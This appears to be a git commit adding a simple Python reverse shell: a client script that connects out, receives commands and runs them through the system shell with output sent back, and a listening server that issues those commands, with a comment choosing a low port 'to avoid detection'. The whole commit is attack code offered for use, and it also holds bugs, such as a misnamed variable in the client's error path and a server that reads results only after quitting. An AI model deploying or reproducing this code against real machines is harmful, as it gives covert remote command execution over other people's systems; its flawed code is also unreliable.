1811dbb8b55f69525f8f36be12f7130c0beddf1a
Tragic <87776484+Tragic-cmd@users.noreply.github.com>
2024-02-11 22:32:38 -0500

    Add files via upload

---
+++ Security/ReverseShell/Client.py
@@ -0,0 +1,32 @@
+''' Meant for the client in a reverse shell connection '''
+
+import socket
+import subprocess
+
+HOST = '0.0.0.0'
+PORT = 87
+
+s = socket.socket()
+
+s.connect((HOST, PORT))
+msg = s.recv(1024)
+print('Server', msg)
+
+while True:
+    cmd = s.recv(1024).decode()
+    print(f'[*] receive {cmd}')
+    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
+        break
+    
+    try:
+        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
+    except Exception as e:
+        results = str(e).encode()
+    
+    if len(result) == 0:
+        result = 'OK'.encode()
+
+    print(len(result), result)
+    s.send(result)
+
+s.close()
---
+++ Security/ReverseShell/Server.py
@@ -0,0 +1,34 @@
+''' This is meant to listen for a reverse shell connection '''
+
+#Needed to form a socket
+import socket
+
+#Host IP address and listening port (Under 1000 to avoid detection)
+HOST = '0.0.0.0'
+PORT = 87
+
+#Creating the socket
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((HOST, PORT))
+
+s.listen(1)
+
+while True: 
+    print(f'[*] listening as {HOST}:{PORT}')
+
+    client = s.accept()
+    print(f'[*] Client connected {client[1]}')
+
+    client[0].send('Welcome'.encode()) #Custom message can be put here.
+    while True:
+        cmd = input('>>> ')
+        client[0].send(cmd.encode())
+
+        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
+            break
+
+    result = client[0].recv(1024).decode()
+    print(result)
+
+s.close()
